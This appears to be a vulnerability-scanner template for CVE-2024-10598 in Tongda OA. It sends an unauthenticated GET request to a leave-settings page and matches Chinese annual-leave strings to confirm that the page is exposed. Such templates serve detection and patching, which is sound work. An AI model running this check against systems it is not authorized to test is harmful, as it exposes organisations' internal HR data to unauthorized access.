id: cve-2024-10598

info:
  name: Tongda OA newLeave/add.html Unauthorized Access
  author: ProjectDiscoveryAI
  severity: medium
  tags: unauthorized-access,cve-2024-10598
  description: |
    Vulnerability in Tongda OA newLeave/add.html allows unauthorized access to sensitive information related to leave settings.

http:
  - method: GET
    path:
      - "{{BaseURL}}/general/hr/setting/attendance/newLeave/add.html"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "contains(gbk_decode(body), '年假设置') && contains(gbk_decode(body), '年假基准设置') && contains(gbk_decode(body), '按入职日期计算') && contains(gbk_decode(body), '按自然年计算')"
          - "contains(body, '年假设置') && contains(body, '年假基准设置') && contains(body, '按入职日期计算') && contains(body, '按自然年计算')"
